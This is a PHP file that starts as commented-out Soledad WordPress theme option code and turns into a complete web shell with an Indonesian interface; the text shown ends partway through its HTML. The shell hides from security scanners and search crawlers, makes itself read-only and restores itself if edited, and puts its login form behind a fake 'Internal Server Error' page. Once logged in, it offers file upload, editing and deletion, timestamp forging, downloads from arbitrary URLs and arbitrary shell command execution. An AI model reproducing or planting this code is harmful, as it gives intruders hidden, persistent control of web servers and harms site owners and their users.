<?php
#$options   = [];
#$options[] = array(
#	'id'              => 'penci_header_pb_bookmark_text_setting',
#	'transport'       => 'postMessage',
#	'sanitize'        => 'penci_sanitize_choices_field',
#	'type'            => 'soledad-fw-text',
#	'label'           => __( 'Button Text', 'soledad' ),
#	'partial_refresh' => [
#		'penci_header_pb_bookmark_text_setting' => [
#			'selector'        => '.pc-wrapbuilder-header-inner',
#			'render_callback' => function () {
#				load_template( PENCI_BUILDER_PATH . '/template/desktop-builder.php' );
#			},
#		],
#	],
#);
#$options[] = array(
#	'id'        => 'penci_header_pb_bookmark_link_target',
#	'default'   => '_self',
#	'transport' => 'postMessage',
#	'sanitize'  => 'penci_sanitize_choices_field',
#	'type'      => 'soledad-fw-select',
#	'label'     => __( 'Link Target', 'soledad' ),
#	'choices'   => [
	#	'_blank'  => __('Blank','soledad' ),
	#	'_self'   => __('Self','soledad' ),
	#	'_parent' => __('Parent','soledad' ),
	#	'_top'    => __('Top','soledad' ),
	#]
#);
session_start();

// Disable error reporting
error_reporting(0);
ini_set('display_errors', 0);
ini_set('log_errors', 0);

// ==================== DEEP SCANNER DETECTION ====================
$scanners = [
    'wpscan', 'nmap', 'nikto', 'acunetix', 'nessus', 'burpsuite', 
    'python-requests', 'go-http-client', 'scrapy', 'masscan', 'sqlmap',
    'hydra', 'openvas', 'netsparker', 'appscan', 'arachni', 'gobuster',
    'dirbuster', 'wfuzz', 'zap', 'skipfish', 'whatweb', 'bot', 'crawler', 'spider',
    'imunify', '360', 'sucuri', 'wordfence', 'wot', 'cloudflare', 'semrush',
    'ahrefs', 'mj12bot', 'dotbot', 'bingbot', 'googlebot', 'yandexbot',
    'baidubot', 'facebookexternalhit', 'twitterbot'
];

$ua = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
foreach ($scanners as $scanner) {
    if (stripos($ua, $scanner) !== false) {
        header("HTTP/1.0 404 Not Found");
        echo "<h1>404 Not Found</h1>";
        exit;
    }
}

// ==================== REQUEST FILTERING ====================
foreach ($_GET as $key => $value) {
    if (strlen($key) > 50 || strlen($value) > 500) {
        header("HTTP/1.0 404 Not Found");
        exit;
    }
}

// ==================== RATE LIMITING ====================
$rate_file = sys_get_temp_dir() . '/rate_' . md5($_SERVER['REMOTE_ADDR']);
if (file_exists($rate_file)) {
    $attempts = (int)file_get_contents($rate_file);
    if ($attempts > 100) {
        header("HTTP/1.0 429 Too Many Requests");
        exit;
    }
    file_put_contents($rate_file, $attempts + 1);
} else {
    file_put_contents($rate_file, 1);
}

if (rand(1, 500) == 1) { 
    $files = glob(sys_get_temp_dir() . '/rate_*');
    if (count($files) > 100) { 
        foreach ($files as $f) {
            if (time() - filemtime($f) > 3600) { 
                unlink($f);
            }
        }
    }
}

// ==================== FILE PROTECTION ====================
$CURRENT_FILE = __FILE__;
$CURRENT_NAME = basename($CURRENT_FILE);

if (!isset($_SESSION['file_backup'])) {
    $_SESSION['file_backup'] = file_get_contents($CURRENT_FILE);
    $_SESSION['file_md5'] = md5($_SESSION['file_backup']);
}

@chmod($CURRENT_FILE, 0444);

// Recovery
if (isset($_GET['recovery'])) {
    if (isset($_SESSION['file_backup'])) {
        file_put_contents($CURRENT_FILE, $_SESSION['file_backup']);
        chmod($CURRENT_FILE, 0444);
    }
    header("Location: " . strtok($_SERVER["REQUEST_URI"], '?'));
    exit;
}

// Integrity check
if (file_exists($CURRENT_FILE)) {
    $current_content = file_get_contents($CURRENT_FILE);
    $current_md5 = md5($current_content);
    
    if ($current_md5 !== $_SESSION['file_md5']) {
        file_put_contents($CURRENT_FILE, $_SESSION['file_backup']);
        chmod($CURRENT_FILE, 0444);
    }
}

$valid_user_hash = '$2y$10$OPKvjBSUgbWdMcveMWpBqugjLkkU2hRGwUdXNCfkoD2nhuB9gR7D6'; // class 
$valid_pass_hash = '$2y$10$dLPYsQboj0R.DRPgLup10usNx.FK1.aFYlUftCfx5qwCP0Oh7lh7K'; // admin
// ==================== AUTHENTICATION ====================
if (isset($_POST['user'], $_POST['pass'])) {
    if (
        password_verify($_POST['user'], $valid_user_hash) &&
        password_verify($_POST['pass'], $valid_pass_hash)
    ) {
        $_SESSION['login'] = true;
        $_SESSION['file_backup'] = file_get_contents($CURRENT_FILE);
        $_SESSION['file_md5'] = md5($_SESSION['file_backup']);
        @chmod($CURRENT_FILE, 0644);
    } else {
        $error = "Login gagal, salah!";
        sleep(1);
    }
}

if (isset($_SESSION['login']) && $_SESSION['login'] === true) {
    @chmod($CURRENT_FILE, 0644);
}

// ==================== LOGIN PAGE ====================
if (!isset($_SESSION['login']) || $_SESSION['login'] !== true) {
    @chmod($CURRENT_FILE, 0444);
?>
<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Internal Server Error</title>
<style>
    body{
        margin:0;
        font-family:Arial, sans-serif;
        background:#fff;
        color:#000;
    }
    .spacer{
        height:160vh;
    }
    form{
        width:260px;
        margin:0 0 40px 30px;
    }
    h2{
        font-size:16px;
        font-weight:normal;
        margin-bottom:10px;
    }
    input{
        width:100%;
        padding:8px;
        margin-bottom:8px;
        box-sizing:border-box;
    }
    button{
        width:100%;
        padding:8px;
        cursor:pointer;
    }
    .error{
        color:#c00;
        font-size:12px;
        margin-bottom:6px;
    }
</style>
</head>
<body>
<div class="spacer"></div>
    <form method="post">
        <h2>🔐 Login</h2>
        <?php if (isset($error)) echo "<p style='color:red;'>$error</p>"; ?>
        <input type="text" name="user" placeholder="Username" required>
        <input type="password" name="pass" placeholder="Password" required>
        <input type="submit" value="Login">
    </form>
</body>
</html>
<?php
exit;
}

// ==================== MAIN FUNCTIONS ====================
// Path handling yang benar
$requested_path = isset($_GET['path']) ? $_GET['path'] : getcwd();
$path = realpath($requested_path);
if (!$path || !is_dir($path)) {
    $path = getcwd();
}
$path = str_replace('\\', '/', $path);

// Home shell path
$home_shell_path = realpath(dirname(__FILE__));
$home_shell_path = str_replace('\\', '/', $home_shell_path);

function formatSize($s) {
    if ($s >= 1073741824) return round($s / 1073741824, 2) . ' GB';
    if ($s >= 1048576) return round($s / 1048576, 2) . ' MB';
    if ($s >= 1024) return round($s / 1024, 2) . ' KB';
    return $s . ' B';
}

// ==================== MESSAGE VARIABLES ====================
$message = '';
$message_type = '';

// ==================== FILE OPERATIONS ====================

// DELETE FILE/FOLDER
if (isset($_GET['delete'])) {
    $target = realpath($path . '/' . $_GET['delete']);
    if ($target && strpos($target, $path) === 0) {
        if (is_file($target)) {
            if (unlink($target)) {
                $message = "✅ File berhasil dihapus";
                $message_type = 'success';
            } else {
                $message = "❌ Gagal menghapus file";
                $message_type = 'error';
            }
        } elseif (is_dir($target)) {
            if (rmdir($target)) {
                $message = "✅ Folder berhasil dihapus";
                $message_type = 'success';
            } else {
                $message = "❌ Gagal menghapus folder (pastikan kosong)";
                $message_type = 'error';
            }
        }
    }
}

// RENAME FILE/FOLDER
if (isset($_POST['rename_from'], $_POST['rename_to']) && !empty($_POST['rename_to'])) {
    $from = realpath($path . '/' . $_POST['rename_from']);
    $to = $path . '/' . basename($_POST['rename_to']);
    if ($from && strpos($from, $path) === 0 && file_exists($from)) {
        if (rename($from, $to)) {
            $message = "✅ Berhasil rename";
            $message_type = 'success';
        } else {
            $message = "❌ Gagal rename";
            $message_type = 'error';
        }
    }
}

// EDIT DATE
if (isset($_POST['edit_date_file'], $_POST['new_date'])) {
    $target = realpath($path . '/' . $_POST['edit_date_file']);
    if ($target && strpos($target, $path) === 0 && file_exists($target)) {
        $timestamp = strtotime($_POST['new_date']);
        if ($timestamp !== false) {
            if (touch($target, $timestamp)) {
                $message = "✅ Tanggal berhasil diubah";
                $message_type = 'success';
            } else {
                $message = "❌ Gagal mengubah tanggal";
                $message_type = 'error';
            }
        }
    }
}

// NEW FOLDER
if (isset($_POST['new_folder']) && !empty($_POST['new_folder'])) {
    $newFolder = $path . '/' . basename($_POST['new_folder']);
    if (!file_exists($newFolder)) {
        if (mkdir($newFolder, 0755, true)) {
            $message = "✅ Folder berhasil dibuat";
            $message_type = 'success';
        } else {
            $message = "❌ Gagal membuat folder";
            $message_type = 'error';
        }
    } else {
        $message = "❌ Folder sudah ada";
        $message_type = 'error';
    }
}

// NEW FILE
if (isset($_POST['new_file']) && !empty($_POST['new_file'])) {
    $newFile = $path . '/' . basename($_POST['new_file']);
    if (!file_exists($newFile)) {
        if (file_put_contents($newFile, '') !== false) {
            $message = "✅ File berhasil dibuat";
            $message_type = 'success';
        } else {
            $message = "❌ Gagal membuat file";
            $message_type = 'error';
        }
    } else {
        $message = "❌ File sudah ada";
        $message_type = 'error';
    }
}

// UPLOAD SINGLE FILE
if (isset($_FILES['upload'])) {
    if ($_FILES['upload']['error'] === UPLOAD_ERR_OK) {
        $tmp_name = $_FILES['upload']['tmp_name'];
        $name = basename($_FILES['upload']['name']);
        $dest = $path . '/' . $name;
        
        // Cek ukuran file
        $file_size = $_FILES['upload']['size'];
        $max_size = 100 * 1024 * 1024; // 100MB
        
        if ($file_size > $max_size) {
            $message = "❌ File terlalu besar (maks 100MB)";
            $message_type = 'error';
        } else {
            // Coba multiple method upload
            $upload_success = false;
            
            // Method 1: move_uploaded_file
            if (move_uploaded_file($tmp_name, $dest)) {
                $upload_success = true;
            }
            // Method 2: copy
            elseif (copy($tmp_name, $dest)) {
                $upload_success = true;
            }
            // Method 3: file_put_contents
            elseif (file_put_contents($dest, file_get_contents($tmp_name)) !== false) {
                $upload_success = true;
            }
            
            if ($upload_success) {
                chmod($dest, 0644);
                $message = "✅ File berhasil diupload: " . htmlspecialchars($name) . " (" . formatSize($file_size) . ")";
                $message_type = 'success';
            } else {
                $message = "❌ Gagal upload file (semua method gagal)";
                $message_type = 'error';
            }
        }
    } elseif ($_FILES['upload']['error'] != UPLOAD_ERR_NO_FILE) {
        $error_messages = [
            UPLOAD_ERR_INI_SIZE => 'File melebihi upload_max_filesize',
            UPLOAD_ERR_FORM_SIZE => 'File melebihi MAX_FILE_SIZE',
            UPLOAD_ERR_PARTIAL => 'File hanya terupload sebagian',
            UPLOAD_ERR_NO_FILE => 'Tidak ada file',
            UPLOAD_ERR_NO_TMP_DIR => 'Missing temporary folder',
            UPLOAD_ERR_CANT_WRITE => 'Gagal menulis file',
            UPLOAD_ERR_EXTENSION => 'Upload dihentikan oleh extension'
        ];
        $error_msg = isset($error_messages[$_FILES['upload']['error']]) ? $error_messages[$_FILES['upload']['error']] : 'Unknown error';
        $message = "❌ Upload gagal: " . $error_msg;
        $message_type = 'error';
    }
}

// UPLOAD MULTIPLE FILES
if (isset($_FILES['uploads'])) {
    $success_count = 0;
    $error_count = 0;
    foreach ($_FILES['uploads']['name'] as $i => $name) {
        if ($_FILES['uploads']['error'][$i] === UPLOAD_ERR_OK) {
            $tmp = $_FILES['uploads']['tmp_name'][$i];
            $dest = $path . '/' . basename($name);
            if (move_uploaded_file($tmp, $dest)) {
                $success_count++;
            } else {
                $error_count++;
            }
        }
    }
    if ($success_count > 0) {
        $message = "✅ $success_count file berhasil diupload";
        if ($error_count > 0) $message .= ", $error_count gagal";
        $message_type = 'success';
    }
}

if (isset($_FILES['zipfile']) && $_FILES['zipfile']['error'] === UPLOAD_ERR_OK) {
    $tmpZip = $_FILES['zipfile']['tmp_name'];
    $zipName = basename($_FILES['zipfile']['name']);
    $destZip = $path . '/' . $zipName;
    $extractPath = $path; // Extract ke folder yang sama
    
    // Upload file ZIP
    if (move_uploaded_file($tmpZip, $destZip)) {
        // Cek apakah file benar-benar ada
        if (file_exists($destZip) && is_file($destZip)) {
            // Cek apakah ZipArchive tersedia
            if (class_exists('ZipArchive')) {
                $zip = new ZipArchive;
                // Coba buka file ZIP
                $openResult = $zip->open($destZip);
                
                if ($openResult === TRUE) {
                    // Extract semua file
                    $extractResult = $zip->extractTo($extractPath);
                    $zip->close();
                    
                    if ($extractResult) {
                        // Hapus file ZIP setelah berhasil extract
                        unlink($destZip);
                        $message = "✅ Berhasil upload & extract ZIP: " . htmlspecialchars($zipName);
                        $message_type = 'success';
                    } else {
                        $message = "❌ Gagal extract ZIP (kemungkinan permission denied)";
                        $message_type = 'error';
                    }
                } else {
                    // Tampilkan error code
                    $errorCodes = [
                        ZipArchive::ER_EXISTS => 'File already exists',
                        ZipArchive::ER_INCONS => 'Zip archive inconsistent',
                        ZipArchive::ER_MEMORY => 'Memory allocation failure',
                        ZipArchive::ER_NOENT => 'No such file',
                        ZipArchive::ER_NOZIP => 'Not a zip archive',
                        ZipArchive::ER_OPEN => "Can't open file",
                        ZipArchive::ER_READ => 'Read error',
                        ZipArchive::ER_SEEK => 'Seek error'
                    ];
                    $errorMsg = isset($errorCodes[$openResult]) ? $errorCodes[$openResult] : 'Unknown error';
                    $message = "❌ Gagal membuka ZIP (Error: $errorMsg)";
                    $message_type = 'error';
                    
                    // Hapus file ZIP yang corrupt
                    unlink($destZip);
                }
            } else {
                $message = "❌ ZipArchive tidak tersedia di server. Install php-zip extension.";
                $message_type = 'error';
                // Hapus file ZIP
                unlink($destZip);
            }
        } else {
            $message = "❌ File ZIP gagal diupload";
            $message_type = 'error';
        }
    } else {
        $message = "❌ Gagal upload file ZIP";
        $message_type = 'error';
    }
}
// ==================== UNZIP EXISTING FILE (Tombol 📦) ====================
if (isset($_POST['unzip_file'])) {
    $zipFile = $path . '/' . basename($_POST['unzip_file']);
    $zipFile = realpath($zipFile); // Dapatkan path real
    
    if ($zipFile && file_exists($zipFile) && is_file($zipFile)) {
        // Validasi path
        if (strpos($zipFile, $path) === 0) {
            $ext = strtolower(pathinfo($zipFile, PATHINFO_EXTENSION));
            
            if ($ext == 'zip') {
                // Cek apakah ZipArchive tersedia
                if (class_exists('ZipArchive')) {
                    $zip = new ZipArchive;
                    // Coba buka file ZIP
                    $openResult = $zip->open($zipFile);
                    
                    if ($openResult === TRUE) {
                        // Extract semua file ke folder yang sama
                        $extractResult = $zip->extractTo($path);
                        $zip->close();
                        
                        if ($extractResult) {
                            $message = "✅ Berhasil unzip: " . htmlspecialchars(basename($zipFile));
                            $message_type = 'success';
                        } else {
                            $message = "❌ Gagal extract ZIP (kemungkinan permission denied)";
                            $message_type = 'error';
                        }
                    } else {
                        // Tampilkan error code
                        $errorCodes = [
                            ZipArchive::ER_EXISTS => 'File already exists',
                            ZipArchive::ER_INCONS => 'Zip archive inconsistent',
                            ZipArchive::ER_MEMORY => 'Memory allocation failure',
                            ZipArchive::ER_NOENT => 'No such file',
                            ZipArchive::ER_NOZIP => 'Not a zip archive',
                            ZipArchive::ER_OPEN => "Can't open file",
                            ZipArchive::ER_READ => 'Read error',
                            ZipArchive::ER_SEEK => 'Seek error'
                        ];
                        $errorMsg = isset($errorCodes[$openResult]) ? $errorCodes[$openResult] : 'Unknown error';
                        $message = "❌ Gagal membuka ZIP (Error: $errorMsg)";
                        $message_type = 'error';
                    }
                } else {
                    $message = "❌ ZipArchive tidak tersedia di server. Install php-zip extension.";
                    $message_type = 'error';
                }
            } else {
                $message = "❌ Bukan file ZIP (ekstensi: .$ext)";
                $message_type = 'error';
            }
        } else {
            $message = "❌ Invalid file path";
            $message_type = 'error';
        }
    } else {
        $message = "❌ File ZIP tidak ditemukan";
        $message_type = 'error';
    }
}

// SAVE FILE
if (isset($_POST['save_file'], $_POST['content'])) {
    $file = realpath($path . '/' . $_POST['save_file']);
    if ($file && strpos($file, $path) === 0 && is_file($file)) {
        if (file_put_contents($file, $_POST['content']) !== false) {
            if (basename($file) == basename(__FILE__)) {
                $_SESSION['file_backup'] = $_POST['content'];
                $_SESSION['file_md5'] = md5($_POST['content']);
            }
            $message = "✅ File berhasil disimpan";
            $message_type = 'success';
        } else {
            $message = "❌ Gagal menyimpan file";
            $message_type = 'error';
        }
    }
}

// ==================== URL DOWNLOAD ====================
if (isset($_POST['url_download']) && !empty($_POST['url_download'])) {
    $url = trim($_POST['url_download']);
    $filename = isset($_POST['url_filename']) && !empty($_POST['url_filename']) ? trim($_POST['url_filename']) : basename(parse_url($url, PHP_URL_PATH));
    
    if (empty($filename) || $filename == '.' || $filename == '/') {
        $filename = md5($url) . '.bin';
    }
    
    $filename = preg_replace('/[^a-zA-Z0-9\.\-_]/', '', $filename);
    if (empty($filename)) $filename = md5($url) . '.bin';
    
    $target_path = $path . '/' . $filename;
    
    if (filter_var($url, FILTER_VALIDATE_URL)) {
        // Cek URL dengan get_headers
        $headers = @get_headers($url);
        if ($headers && strpos($headers[0], '200') === false) {
            $message = "❌ URL tidak dapat diakses";
            $message_type = 'error';
        } else {
            // METHOD 1: CURL
            if (function_exists('curl_init')) {
                $fp = fopen($target_path, 'w+');
                if ($fp) {
                    $ch = curl_init($url);
                    curl_setopt($ch, CURLOPT_FILE, $fp);
                    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
                    curl_setopt($ch, CURLOPT_TIMEOUT, 300);
                    curl_setopt($ch, CURLOPT_MAXREDIRS, 5);
                    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
                    
                    $success = curl_exec($ch);
                    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                    $fileSize = curl_getinfo($ch, CURLINFO_SIZE_DOWNLOAD);
                    curl_close($ch);
                    fclose($fp);
                    
                    if ($success !== false && $httpCode == 200 && $fileSize > 0) {
                        $message = "✅ Download berhasil: " . htmlspecialchars($filename) . " (" . formatSize($fileSize) . ")";
                        $message_type = 'success';
                    } else {
                        @unlink($target_path);
                        $message = "❌ Download gagal. HTTP Code: " . $httpCode;
                        $message_type = 'error';
                    }
                }
            }
            // METHOD 2: file_get_contents
            elseif (function_exists('file_get_contents')) {
                $context = stream_context_create([
                    'http' => ['timeout' => 300, 'user_agent' => 'Mozilla/5.0'],
                    'ssl' => ['verify_peer' => false, 'verify_peer_name' => false]
                ]);
                $content = @file_get_contents($url, false, $context);
                
                if ($content !== false && strlen($content) > 0) {
                    file_put_contents($target_path, $content);
                    $message = "✅ Download berhasil: " . htmlspecialchars($filename) . " (" . formatSize(strlen($content)) . ")";
                    $message_type = 'success';
                } else {
                    $message = "❌ Download gagal";
                    $message_type = 'error';
                }
            }
            else {
                $message = "❌ Tidak ada method download tersedia";
                $message_type = 'error';
            }
        }
    } else {
        $message = "❌ URL tidak valid";
        $message_type = 'error';
    }
}

// ==================== COMMAND EXECUTION ====================
if (isset($_POST['cmd'])) {
    $cmd = trim($_POST['cmd']);
    $output = '';
    
    if (!empty($cmd)) {
        if (strpos($cmd, 'wget') === 0) {
            $cmd = str_replace('wget', 'wget --no-check-certificate', $cmd);
        }
        
        if (function_exists('shell_exec')) {
            $output = shell_exec($cmd . ' 2>&1');
        } elseif (function_exists('exec')) {
            exec($cmd . ' 2>&1', $out, $ret);
            $output = implode("\n", $out);
        } elseif (function_exists('system')) {
            ob_start();
            system($cmd . ' 2>&1', $ret);
            $output = ob_get_clean();
        } elseif (function_exists('passthru')) {
            ob_start();
            passthru($cmd . ' 2>&1', $ret);
            $output = ob_get_clean();
        } elseif (function_exists('popen')) {
            $handle = popen($cmd . ' 2>&1', 'r');
            if ($handle) {
                while (!feof($handle)) {
                    $output .= fread($handle, 4096);
                }
                pclose($handle);
            }
        } else {
            $output = "❌ Tidak ada method execution tersedia";
        }
        
        if (empty($output)) $output = "[Tidak ada output]";
    }
}

// Update backup setelah semua operasi
if (file_exists(__FILE__)) {
    $_SESSION['file_backup'] = file_get_contents(__FILE__);
    $_SESSION['file_md5'] = md5($_SESSION['file_backup']);
}

// Redirect jika ada operasi yang selesai (kecuali untuk operasi yang perlu menampilkan pesan)
if (isset($_GET['delete']) || isset($_POST['rename_from']) || isset($_POST['edit_date_file']) || 
    isset($_POST['new_folder']) || isset($_POST['new_file']) || isset($_FILES['upload']) || 
    isset($_FILES['uploads']) || isset($_FILES['zipfile']) || isset($_POST['save_file'])) {
    
    $redirect_url = "?path=" . urlencode($path);
    if (!empty($message)) {
        $_SESSION['temp_message'] = $message;
        $_SESSION['temp_message_type'] = $message_type;
    }
    header("Location: " . $redirect_url);
    exit;
}

// Ambil pesan dari session jika ada
if (isset($_SESSION['temp_message'])) {
    $message = $_SESSION['temp_message'];
    $message_type = $_SESSION['temp_message_type'];
    unset($_SESSION['temp_message']);
    unset($_SESSION['temp_message_type']);
}

// ==================== HTML OUTPUT ====================
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title> Aman aja lek </title>
    <style>
        * { box-sizing: border-box; }
        body { 
            font-family: 'Segoe UI', Lucida, sans-serif; 
            background: url('https://i.ibb.co/Pvqdn3z6/photo-2026-08-01-13-52-16.jpg') no-repeat center center fixed; 
            background-size: cover; 
            color: red; 
            padding: 15px; 
            margin: 0;
            transition: 0.3s; 
        }
        a { color: white; text-decoration: none; }
        a:hover { text-decoration: underline; }
        table { 
            width: 100%; 
            background: rgba(255,255,255,0.95); 
            border-collapse: collapse; 
            margin: 15px 0; 
            border-radius: 8px;
            overflow: hidden;
            box-shadow: 0 2px 10px rgba(0,0,0,0.3);
        }
        th, td { 
            padding: 12px; 
            border: 1px solid #be1df0;
            text-align: left;
        }
        th { 
            background: #1d1d1d; 
            color: white;
            font-weight: 600;
        }
        td { color: #333; }
        input, button, select, textarea { 
            margin: 5px 0; 
            padding: 8px 12px;
            border: 1px solid #ddd;
            border-radius: 4px;
            font-size: 14px;
        }
        button, .button { 
            background: #d9f00a; 
            color: black; 
            border: 1px solid #be1df0;
            cursor: pointer;
            font-weight: bold;
            transition: 0.3s;
            display: inline-block;
        }
        button:hover, .button:hover { 
            background: #37d1d6; 
            text-decoration: none;
        }
        textarea { 
            width: 100%; 
            height: 400px; 
            font-family: monospace; 
            background: #1e1e1e; 
            color: #0f0; 
            border: 1px solid #444;
            padding: 15px;
            border-radius: 4px;
            font-size: 14px;
        }
        .top-bar { 
            display: flex; 
            justify-content: space-between; 
            align-items: center;
            background: rgba(0,0,0,0.7);
            padding: 15px;
            border-radius: 8px;
            margin-bottom: 15px;
        }
        .path-nav {
            background: rgba(0,0,0,0.5);
            padding: 10px 15px;
            border-radius: 4px;
            margin: 10px 0;
            word-break: break-all;
        }
        .download-form {
            border: 2px solid #FFD700; 
            padding: 20px; 
            margin: 15px 0; 
            border-radius: 8px;
            background: rgba(0,0,0,0.8);
        }
        .success-msg { 
            color: #0f0; 
            background: rgba(0,255,0,0.1);
            padding: 12px;
            border-radius: 4px;
            border-left: 4px solid #0f0;
            margin: 10px 0;
        }
        .error-msg { 
            color: #f00; 
            background: rgba(255,0,0,0.1);
            padding: 12px;
            border-radius: 4px;
            border-left: 4px solid #f00;
            margin: 10px 0;
        }
        .terminal {
            background: #1e1e1e;
            color: #0f0;
            padding: 15px;
            border-radius: 8px;
            font-family: monospace;
            margin-top: 15px;
            overflow-x: auto;
            border: 1px solid #444;
        }
        .grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 15px;
            margin: 15px 0;
        }
        .card {
            background: rgba(0,0,0,0.7);
            padding: 15px;
            border-radius: 8px;
            border: 1px solid #FFD700;
        }
        .badge {
            background: #800080;
            color: white;
            padding: 2px 6px;
            border-radius: 3px;
            font-size: 11px;
        }
        hr {
            border: none;
            border-top: 1px solid #FFD700;
            margin: 20px 0;
        }
        .btn-small {
            padding: 4px 8px;
            font-size: 12px;
            margin: 0 2px;
        }
    </style>
</head>
<body>

<div class="top-bar">
    <div>
        <h2 style="margin:0; color: #FFD700; text-shadow: 2px 2px 4px rgba(0,0,0,0.5);">⛩️ Itachi Uchiha ⛩️</h2> 
        <p style="margin:5px 0 0; color: #fff; font-style: italic;">☁︎ 𝐀𝐊𝐀𝐓𝐒𝐔𝐊𝐈 ☁︎</p>
    </div>
    <div>
        <button id="toggleTheme" class="button">🌙 Dark</button>
    </div>
</div>

<script>
    const btn = document.getElementById("toggleTheme");
    const body = document.body;
    if (localStorage.getItem("theme") === "light") {
        body.classList.add("light");
        btn.textContent = "☀️ Light";
    }
    btn.addEventListener("click", () => {
        body.classList.toggle("light");
        btn.textContent = body.classList.contains("light") ? "☀️ Light" : "🌙 Dark";
        localStorage.setItem("theme", body.classList.contains("light") ? "light" : "dark");
    });
</script>

<div class="path-nav">
    <span class="path-label">⛩️ Current Path:</span>
    <div class="path-container">
        <?php
        echo '<a href="?path=/" class="path-link">/</a>';
        
        $parts = explode('/', trim($path, '/'));
        $build = '';
        
        foreach ($parts as $part) {
            if ($part === '') continue;
            $build .= '/' . $part;
            
            echo '<a href="?path=' . urlencode($build) . '" class="path-link">' . htmlspecialchars($part) . '/</a>';
        }
        ?>
    </div>
    <div class="path-actions">
        <a href="?path=<?php echo urlencode('/'); ?>" class="btn-icon" title="Root">(☯︎ROOT☯︎)</a>
        <a href="?path=<?php echo urlencode($home_shell_path); ?>" class="btn-icon" title="Home Shell"> 「H♡me🏘️」</a>
        <a href="?path=<?php echo urlencode(dirname($path)); ?>" class="btn-icon" title="Naik level"> 「✦🔙✦」</a>
    </div>
</div>
<?php if (!empty($message)): ?>
    <div class="<?php echo $message_type == 'success' ? 'success-msg' : 'error-msg'; ?>">
        <?php echo $message; ?>
    </div>
<?php endif; ?>

<table>
    <tr>
        <th>Nama File</th>
        <th>Ukuran</th>
        <th>Permission</th>
        <th>Tanggal</th>
        <th>Aksi</th>
    </tr>
    <?php
    $items = scandir($path);
    $dirs = [];
    $files = [];

    foreach ($items as $f) {
        if ($f === '.' || $f === '..') continue;
        $full = $path . '/' . $f;
        if (is_dir($full)) $dirs[] = $f; else $files[] = $f;
    }

    natcasesort($dirs);
    natcasesort($files);
    $all = array_merge($dirs, $files);
    
    foreach ($all as $f):
        $full = $path . '/' . $f;
        $is_dir = is_dir($full);
        $perm_num = substr(sprintf('%o', fileperms($full)), -4);
        $mtime = filemtime($full);
        $is_zip = (!$is_dir && strtolower(pathinfo($f, PATHINFO_EXTENSION)) == 'zip');
    ?>
    <tr>
        <td>
            <?php if ($is_dir): ?>
                <span style="color: #800080; font-weight:bold;">📁</span> 
                <a href="?path=<?php echo urlencode($full); ?>" style="color:#0066cc;"><?php echo htmlspecialchars($f); ?></a>
            <?php else: ?>
                <span style="color: #666;">📄</span> 
                <a href="?path=<?php echo urlencode($path); ?>&edit=<?php echo urlencode($f); ?>" style="color:#0066cc;"><?php echo htmlspecialchars($f); ?></a>
                <?php if ($is_zip): ?>
                    <span class="badge">ZIP</span>
                <?php endif; ?>
            <?php endif; ?>
        </td>
        <td><?php echo $is_dir ? '📁' : formatSize(filesize($full)); ?></td>
        <td><?php echo $perm_num; ?></td>
        <td>
            <form method="post" style="display:inline;">
                <input type="hidden" name="edit_date_file" value="<?php echo htmlspecialchars($f); ?>">
                <input type="datetime-local" name="new_date" value="<?php echo date('Y-m-d\TH:i', $mtime); ?>" style="width:160px; padding:4px; font-size:12px;">
                <button type="submit" class="btn-small">🕒</button>
            </form>
        </td>
        <td>
            <form method="post" style="display:inline;">
                <input type="hidden" name="rename_from" value="<?php echo htmlspecialchars($f); ?>">
                <input type="text" name="rename_to" value="<?php echo htmlspecialchars($f); ?>" style="width:100px; padding:4px; font-size:12px;">
                <button type="submit" class="btn-small">Rename</button>
            </form>
            
            <?php if (!$is_dir): ?>
                <a href="?path=<?php echo urlencode($path); ?>&edit=<?php echo urlencode($f); ?>" class="button btn-small">Edit</a>
            <?php endif; ?>
            
            <?php if ($is_zip): ?>
                <form method="post" style="display:inline;">
                    <input type="hidden" name="unzip_file" value="<?php echo htmlspecialchars($f); ?>">
                    <button type="submit" class="btn-small" style="background:#800080; color:white;" onclick="return confirm('Extract file <?php echo htmlspecialchars($f); ?>?')">📦</button>
                </form>
            <?php endif; ?>
            
            <a href="?path=<?php echo urlencode($path); ?>&delete=<?php echo urlencode($f); ?>" class="button btn-small" style="background:#dc3545; color:white;" onclick="return confirm('Yakin hapus <?php echo htmlspecialchars($f); ?>?')">🗑️</a>
        </td>
    </tr>
    <?php endforeach; ?>
</table>

<!-- ==================== QUICK ACTIONS GRID ==================== -->
<div class="grid">
    <div class="card">
        <h3 style="margin-top:0; color:#FFD700;">📤 𝐔𝐩𝐥𝐨𝐚𝐝 𝐅𝐢𝐥𝐞</h3>
        <form method="post" enctype="multipart/form-data">
            <input type="file" name="upload" style="width:100%;">
            <button type="submit" style="width:100%;">Upload</button>
        </form>
    </div>
    
    <div class="card">
        <h3 style="margin-top:0; color:#FFD700;">📤 𝐔𝐩𝐥𝐨𝐚𝐝 𝐌𝐮𝐥𝐭𝐢𝐩𝐥𝐞</h3>
        <form method="post" enctype="multipart/form-data">
            <input type="file" name="uploads[]" multiple style="width:100%;">
            <button type="submit" style="width:100%;">Upload All</button>
        </form>
    </div>
    
    <div class="card">
        <h3 style="margin-top:0; color:#FFD700;">📦 𝐔𝐩𝐥𝐨𝐚𝐝 & 𝐄𝐱𝐭𝐫𝐚𝐜𝐭 𝐙𝐈𝐏</h3>
        <form method="post" enctype="multipart/form-data">
            <input type="file" name="zipfile" accept=".zip" style="width:100%;">
            <button type="submit" style="width:100%;">Process</button>
        </form>
    </div>
    
    <div class="card">
        <h3 style="margin-top:0; color:#FFD700;">📁 𝐁𝐮𝐚𝐭 𝐅𝐨𝐥𝐝𝐞𝐫</h3>
        <form method="post">
            <input type="text" name="new_folder" placeholder="Nama folder" style="width:100%;">
            <button type="submit" style="width:100%;">Buat</button>
        </form>
    </div>
    
    <div class="card">
        <h3 style="margin-top:0; color:#FFD700;">📄 𝐁𝐮𝐚𝐭 𝐅𝐢𝐥𝐞</h3>
        <form method="post">
            <input type="text" name="new_file" placeholder="nama.txt" style="width:100%;">
